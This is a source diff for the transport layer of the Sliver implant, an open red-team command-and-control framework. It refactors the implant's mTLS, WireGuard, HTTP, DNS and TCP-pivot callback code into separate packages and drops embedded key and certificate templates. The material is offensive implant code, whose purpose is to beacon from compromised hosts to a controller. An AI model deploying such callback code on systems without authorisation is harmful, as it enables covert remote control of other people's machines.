@@ -19,6 +19,7 @@ package transports
 */
 
 import (
+	"fmt"
 	insecureRand "math/rand"
 
 	// {{if or .Config.HTTPc2Enabled .Config.TCPPivotc2Enabled .Config.WGc2Enabled}}
@@ -29,14 +30,21 @@ import (
 	"log"
 	// {{end}}
 
-	"crypto/x509"
+	// {{if .Config.MTLSc2Enabled}}
+	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
+	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
+
+	// {{end}}
+
 	// {{if .Config.WGc2Enabled}}
 	"errors"
+
+	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
+
 	// {{end}}
 
 	"io"
 	"net/url"
-	"os"
 	"strconv"
 	"sync"
 	"time"
@@ -44,27 +52,14 @@ import (
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if .Config.HTTPc2Enabled}}
+	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	"google.golang.org/protobuf/proto"
 	// {{end}}
-
 	// {{if .Config.TCPPivotc2Enabled}}
-	"strings"
 	// {{end}}
 )
 
 var (
-	mtlsPingInterval = 30 * time.Second
-
-	keyPEM            = `{{.Config.Key}}`
-	certPEM           = `{{.Config.Cert}}`
-	caCertPEM         = `{{.Config.CACert}}`
-	wgImplantPrivKey  = `{{.Config.WGImplantPrivKey}}`
-	wgServerPubKey    = `{{.Config.WGServerPubKey}}`
-	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
-	wgKeyExchangePort = getWgKeyExchangePort()
-	wgTcpCommsPort    = getWgTcpCommsPort()
-
-	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
 	reconnectInterval = -1
 	pollInterval      = -1
@@ -374,22 +369,6 @@ func getMaxConnectionErrors() int {
 	return maxConnectionErrors
 }
 
-func getWgKeyExchangePort() int {
-	wgKeyExchangePort, err := strconv.Atoi(`{{.Config.WGKeyExchangePort}}`)
-	if err != nil {
-		return 1337
-	}
-	return wgKeyExchangePort
-}
-
-func getWgTcpCommsPort() int {
-	wgTcpCommsPort, err := strconv.Atoi(`{{.Config.WGTcpCommsPort}}`)
-	if err != nil {
-		return 8888
-	}
-	return wgTcpCommsPort
-}
-
 // {{if .Config.MTLSc2Enabled}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
@@ -399,7 +378,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 	if err != nil {
 		lport = 8888
 	}
-	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
+	conn, err := mtls.MtlsConnect(uri.Hostname(), uint16(lport))
 	if err != nil {
 		return nil, err
 	}
@@ -433,12 +412,12 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 				if !ok {
 					return
 				}
-				err := socketWriteEnvelope(conn, envelope)
+				err := mtls.WriteEnvelope(conn, envelope)
 				if err != nil {
 					return
 				}
-			case <-time.After(mtlsPingInterval):
-				socketWritePing(conn)
+			case <-time.After(mtls.PingInterval):
+				mtls.WritePing(conn)
 				if err != nil {
 					return
 				}
@@ -449,7 +428,7 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 	go func() {
 		defer connection.Cleanup()
 		for {
-			envelope, err := socketReadEnvelope(conn)
+			envelope, err := mtls.ReadEnvelope(conn)
 			if err == io.EOF {
 				break
 			}
@@ -488,7 +467,7 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 		return nil, errors.New("{{if .Config.Debug}}Invalid address{{end}}")
 	}
 	hostname := addrs[0]
-	conn, dev, err := wgSocketConnect(hostname, uint16(lport))
+	conn, dev, err := wireguard.WireguardConnect(hostname, uint16(lport))
 	if err != nil {
 		return nil, err
 	}
@@ -523,12 +502,12 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 				if !ok {
 					return
 				}
-				err := socketWGWriteEnvelope(conn, envelope)
+				err := wireguard.WriteEnvelope(conn, envelope)
 				if err != nil {
 					return
 				}
-			case <-time.After(mtlsPingInterval):
-				socketWGWritePing(conn)
+			case <-time.After(mtls.PingInterval):
+				wireguard.WritePing(conn)
 				if err != nil {
 					return
 				}
@@ -539,7 +518,7 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 	go func() {
 		defer connection.Cleanup()
 		for {
-			envelope, err := socketWGReadEnvelope(conn)
+			envelope, err := wireguard.ReadEnvelope(conn)
 			if err == io.EOF {
 				break
 			}
@@ -565,7 +544,7 @@ func httpConnect(c2URI *url.URL) (*Connection, error) {
 	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
 	// {{end}}
 	proxyConfig := c2URI.Query().Get("proxy")
-	client, err := HTTPStartSession(c2URI.Host, c2URI.Path, proxyConfig)
+	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, proxyConfig)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
@@ -675,7 +654,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
-	sessionID, sessionKey, err := dnsStartSession(dnsParent)
+	sessionID, sessionKey, err := dnsclient.DnsConnect(dnsParent)
 	if err != nil {
 		return nil, err
 	}
@@ -707,13 +686,14 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	go func() {
 		defer connection.Cleanup()
 		for envelope := range send {
-			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
+			dnsclient.SendEnvelope(dnsParent, sessionID, sessionKey, envelope)
 		}
 	}()
 
+	pollInterval := GetPollInterval()
 	go func() {
 		defer connection.Cleanup()
-		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+		dnsclient.Poll(dnsParent, sessionID, sessionKey, pollInterval, ctrl, recv)
 	}()
 
 	activeConnection = connection
@@ -724,7 +704,10 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 
 // {{if .Config.TCPPivotc2Enabled}}
 func tcpPivotConnect(uri *url.URL) (*Connection, error) {
-	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
+	addr := fmt.Sprintf("%s:%s", uri.Hostname(), uri.Port())
+	// {{if .Config.Debug}}
+	log.Printf("Attempting to connect via TCP Pivot to: %s\n", addr)
+	// {{end}}
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		return nil, err
@@ -780,41 +763,3 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} -TCPPivotc2Enabled
-
-// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
-// we have to disable all of the certificate validation and re-implement everything.
-// https://github.com/golang/go/issues/21971
-func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {
-
-	roots := x509.NewCertPool()
-	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
-	if !ok {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to parse root certificate")
-		// {{end}}
-		os.Exit(3)
-	}
-
-	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to parse certificate: " + err.Error())
-		// {{end}}
-		return err
-	}
-
-	// Basically we only care if the certificate was signed by our authority
-	// Go selects sensible defaults for time and EKU, basically we're only
-	// skipping the hostname check, I think?
-	options := x509.VerifyOptions{
-		Roots: roots,
-	}
-	if _, err := cert.Verify(options); err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to verify certificate: " + err.Error())
-		// {{end}}
-		return err
-	}
-
-	return nil
-}
